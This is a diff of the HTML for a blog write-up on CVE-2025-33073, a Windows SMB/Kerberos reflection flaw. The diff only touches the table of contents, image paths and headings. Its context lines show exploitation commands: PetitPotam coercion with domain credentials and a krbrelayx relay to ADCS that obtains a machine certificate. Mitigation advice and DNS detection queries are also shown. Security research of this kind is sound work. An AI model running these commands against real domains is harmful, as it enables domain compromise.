@@ -21,7 +21,7 @@
 {"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Zavier Lee"},"dateModified":"2025-06-13T00:00:00-04:00","datePublished":"2025-06-13T00:00:00-04:00","headline":"Sysadmins in Shambles (CVE-2025-33073)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/sysadmins-in-shambles.html"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"http://localhost:4000/assets/img/logo.png"},"name":"Zavier Lee"},"url":"http://localhost:4000/sysadmins-in-shambles.html"}</script>
 <!-- End Jekyll SEO tag -->
 
-    <link rel="stylesheet" href="/assets/css/style.css?v=afce24b573f938ccf866b7f940538c1ee7489f4b">
+    <link rel="stylesheet" href="/assets/css/style.css?v=edfed2e8d4b67a714938b82b8968ff8e5624922f">
     <!--[if lt IE 9]>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/html5shiv/3.7.3/html5shiv.min.js"></script>
     <![endif]-->
@@ -482,15 +482,18 @@
                 <a href="#reflecting-to-http-adcs">Reflecting to HTTP (ADCS)</a>
                 <ul>
                     <li><a href="#reflecting-to-certificate-authority-self-relay">Reflecting to Certificate Authority (Self-Relay)</a></li>
+                    <li><a href="#relaying-to-domain-machines">Relaying to Domain Machines</a></li>
                 </ul>
             </li>
             <li>
                 <a href="#summary--patches">Summary &amp; Patches</a>
+                <ul>
+                    <li><a href="#detection-guidelines">Detection Guidelines</a></li>
+                </ul>
             </li>
         </ol>
     </div>
 </div>
-
 <h2 id="context">Context</h2>
 
 <p>The <code class="language-plaintext highlighter-rouge">PALACE-DC.jess.kingdom</code> domain controller has SMB signing enabled, and serves as the DNS server for the domain. The <code class="language-plaintext highlighter-rouge">SCRIPTORIUM.jess.kingdom</code> machine is a domain-joined machine that does not have SMB signing enabled. The attacker has the ability to create DNS records in the domain.</p>
@@ -634,18 +637,18 @@ SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom. 180 IN A 1
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/PetitPotam/PetitPotam.py -d 'jess.kingdom' -u 'Doros_ARCHIVON' -p 'bO3n21E6rc' palace-dc1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA SCRIPTORIUM.jess.kingdom
 </code></pre></div></div>
 
-<p><img src="./assets/img/sysadmin/20d83fa61526390953f13652cbaec77c.png" alt="" /></p>
+<p><img src="/assets/img/sysadmin/20d83fa61526390953f13652cbaec77c.png" alt="" /></p>
 
 <p>The <code class="language-plaintext highlighter-rouge">--victim</code> flag is used to specify the account name used in the certificate, as the <code class="language-plaintext highlighter-rouge">ntlmrelayx.py</code> library may fail to determine the correct account name to use in the certificate. In this case, we will use <code class="language-plaintext highlighter-rouge">SCRIPTORIUM$</code> as the victim account.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>/opt/tools/krbrelayx/krbrelayx.py --target 'https://PALACE-DC.jess.kingdom/certsrv/certfnsh.asp' --adcs --template 'Machine' --victim 'SCRIPTORIUM$'
 </code></pre></div></div>
 
-<p><img src="./assets/img/sysadmin/10796a351068cd7270c7d4427588f118.png" alt="" /></p>
+<p><img src="/assets/img/sysadmin/10796a351068cd7270c7d4427588f118.png" alt="" /></p>
 
 <p>And similarly, this certificate can be used to compromise the <code class="language-plaintext highlighter-rouge">SCRIPTORIUM</code> machine using <a href="https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-sfu/02636893-7a1f-4357-af9a-b672e3e3de13">S4U2self</a>:</p>
 
-<p><img src="./assets/img/sysadmin/e99c74a91d192594f258c71bb09431c8.png" alt="" /></p>
+<p><img src="/assets/img/sysadmin/e99c74a91d192594f258c71bb09431c8.png" alt="" /></p>
 
 <h2 id="summary--patches">Summary &amp; Patches</h2>
 
@@ -659,7 +662,7 @@ SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom. 180 IN A 1
 
 <p>In order to mitigate this vulnerability, it is recommended to install the <a href="https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073">latest security updates</a> and enable SMB signing on all machines in the domain.</p>
 
-<h3 id="detection">Detection</h3>
+<h3 id="detection-guidelines">Detection Guidelines</h3>
 
 <p>Thankfully this vulnerability, as well as the trick to coerce <code class="language-plaintext highlighter-rouge">Kerberos</code> authentication requires an attacker to create a relatively strange DNS record (ending with <code class="language-plaintext highlighter-rouge">1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA</code>). It is possible to hunt for the creation of such DNS records using the following PowerShell command:</p>
 
@@ -677,7 +680,7 @@ SCRIPTORIUM1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA.jess.kingdom. 180 IN A 1
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>(dns.question.type : "A" and dns.question.name : *1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA*)
 </code></pre></div></div>
 
-<p><img src="./assets/img/sysadmin/90c7ce91334c42784c0f8f5918467df2.png" alt="" /></p>
+<p><img src="/assets/img/sysadmin/90c7ce91334c42784c0f8f5918467df2.png" alt="" /></p>
 
 
 <script>
